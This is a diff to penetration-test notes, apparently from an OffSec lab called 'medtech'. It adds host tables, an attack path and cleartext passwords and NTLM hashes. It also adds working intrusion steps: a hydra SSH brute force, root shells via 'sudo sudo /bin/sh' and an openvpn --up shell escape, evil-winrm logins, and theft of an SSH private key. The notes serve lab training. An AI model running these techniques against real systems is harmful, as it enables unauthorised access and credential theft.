@@ -7,11 +7,11 @@ Recently formed IoT healthcare startup.
 
 # Hosts
 ## External
-| IP            | Name  | Services         | Flags                |
-| ------------- | ----- | ---------------- | -------------------- |
-| 192.168.x.120 | PAW!  | ssh, http        | proof.txt            |
-| 192.168.x.121 | WEB02 | smb, http, winrm | ~~proof.txt~~        |
-| 192.168.x.122 | .     | ssh              | local.txt, proof.txt |
+| IP            | Name  | Services         | Flags                        |
+| ------------- | ----- | ---------------- | ---------------------------- |
+| 192.168.x.120 | WEB01 | ssh, http        | ~~proof.txt~~                |
+| 192.168.x.121 | WEB02 | smb, http, winrm | ~~proof.txt~~                |
+| 192.168.x.122 | .     | ssh              | ~~local.txt,~~ ~~proof.txt~~ |
 
 ## Internal
 | IP          | Name     | Services-nxc    | Flags                |
@@ -20,7 +20,7 @@ Recently formed IoT healthcare startup.
 | 172.16.x.11 | FILES02  | smb, winrm      | ~~local~~, ~~proof~~ |
 | 172.16.x.12 | DEV04    | smb, rdp, winrm | ~~local~~, ~~proof~~ |
 | 172.16.x.13 | PROD01   | smb, winrm      | ~~proof~~            |
-| 172.16.x.14 | .        | ssh             | **local**            |
+| 172.16.x.14 | .        | ssh             | ~~local~~            |
 | 172.16.x.82 | CLIENT01 | smb, rdp        | ~~proof~~            |
 | 172.16.x.83 | CLIENT02 | smb, winrm      | ~~local~~, ~~proof~~ |
 
@@ -58,13 +58,16 @@ net accounts
 	- DEV04 - Mushroom!    (admin)
 	- CLIENT01 - Mushroom!    (admin)
 - offsec
+	- WEB01 - century62hisan51
 - administrator:
 	- NTLM - b2c03054c306ac8fc5f9d188710b0168
 	- NTLM - f1014ac49bae005ee3ece5f47547d185
 	- NTLM - a7c5480e8c1ef0ffec54e99275e6e0f7
 	- NTLM - 00fd074ec24fd70c76727ee9b2d7aacd
 
+# Path
 
+.121 -> .11 -> .12 / .82 / .83 | .83 -> .13/ .10 | .10 -> .120 | .122 -> .14
 
 # Methodology
 
@@ -248,23 +251,7 @@ type "C:\Users\wario\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Con
 	$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 	New-PSSession -ComputerName 172.16.50.83 -Credential $credential
 	New-PSSession -ComputerName CLIENT02 -Credential $credential
-	New-PSSession -ComputerName 172.16.50.83 -Credential $credential -Port 5986
-	New-PSSession -ComputerName 172.16.50.83 -Credential $credential -Port 5986 -Usessl
-	New-PSSession -ComputerName 172.16.50.83 -Credential $credential
-	Enter-PSSession -ComputerName 172.16.50.83 -Credential $credential
-	exit
-	$username='wario';
-	$credential = New-Object System.Management.Automation.PSCredential $username,$secureString;
-	New-PSSession -ComputerName 172.16.50.83 -Credential $credential
-	hostname
-	New-PSSession -ComputerName CLIENT02 -Credential $credential
-	exit
-	$username='wario';
-	$credential = New-Object System.Management.Automation.PSCredential $username,$secureString;
-	New-PSSession -ComputerName CLIENT02 -Credential $credential
-	hostname
-	Enter-PSSession
-	Enter-PSSession 1
+	...
 	hostname
 ```
 #### impacket-secretsdump & hashcat
@@ -360,12 +347,10 @@ type C:\users\administrator\desktop\proof.txt
 ```bash
 xfreerdp /cert-ignore /u:yoshi /p:Mushroom! /d:medtech.com /v:172.16.246.82
 ```
-
 ####  PrivEsc
 ```powershell
 Start-Process powershell -Verb runAs
 ```
-
 ####  Enumeration & proof.txt
 ```powershell
 Get-ChildItem -Path C:\users -Include *.txt,*.doc,*.docx,*.xls,*.xlsx,password*,*.pdf -Recurse -ErrorAction SilentlyContinue -Force
@@ -447,8 +432,107 @@ type C:\users\administrator\desktop\proof.txt
 ```bash
 evil-winrm -i 172.16.179.10 -u leon -p "rabbit:)"
 ```
+#### WinPEAS & Creds
+```powershell
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
+    C:\Users\Administrator\Desktop\credentials.txt
+
+
+type C:\Users\Administrator\Desktop\credentials.txt
+	web01: offsec/century62hisan51
+```
+
 #### proof.txt
 ```powershell
 type C:\users\administrator\desktop\proof.txt
 ```
 
+## 192.168.x.120
+#### Foothold
+```bash
+ssh offsec@192.168.217.120
+	century62hisan51
+```
+#### Enumeration & linPEAS
+```bash
+sudo -l
+	Matching Defaults entries for offsec on WEB01:
+	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+	
+	User offsec may run the following commands on WEB01:
+	    (ALL) NOPASSWD: ALL
+	    (ALL : ALL) NOPASSWD: ALL
+
+					  ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════     
+                      ╚════════════════════════════════════╝
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                ...
+-rwsr-xr-x 1 root root 179K Feb 27  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+```
+#### PrivEsc & proof.txt
+```bash
+sudo sudo /bin/sh
+# whoami
+	root
+# find / -name proof.txt 2>/dev/null
+	/root/proof.txt
+# cat /root/proof.txt
+	2e9ccc730d5e7df9acd7a91ba31420cb
+```
+
+## 192.168.x.122
+
+#### Foothold & local.txt
+```bash
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.217.122
+	[22][ssh] host: 192.168.217.122   login: offsec   password: password
+
+offsec:~$ ls
+	local.txt
+offsec:~$ cat local.txt
+	14e3a05ad0623693c3c8ad3f8216a98d
+```
+#### PrivEsc & proof
+```bash
+help
+	cat  cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo  sudo
+
+sudo -l
+	User offsec may run the following commands on vpn:
+	    (ALL : ALL) /usr/sbin/openvpn
+
+history
+	...
+	sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+
+# whoami
+	root
+
+# cat /root/proof.txt
+	1320e4789bf442ba287c2b9004369688
+```
+#### ssh key
+```bash
+ls -a /home/mario/.ssh
+	.  ..  id_rsa  id_rsa.pub  known_hosts  known_hosts.old
+
+cat id_rsa
+	-----BEGIN OPENSSH PRIVATE KEY-----
+	...
+```
+
+## 172.16.x.14
+#### Foothold & local.txt
+```bash
+chmod 400 mario.ssh
+
+ssh mario@172.16.217.14 -i mario.ssh
+
+$ whoami
+	mario
+
+$ cat local.txt
+	cf4a52a9b15282a9e1b9e11278eb87e5
+```
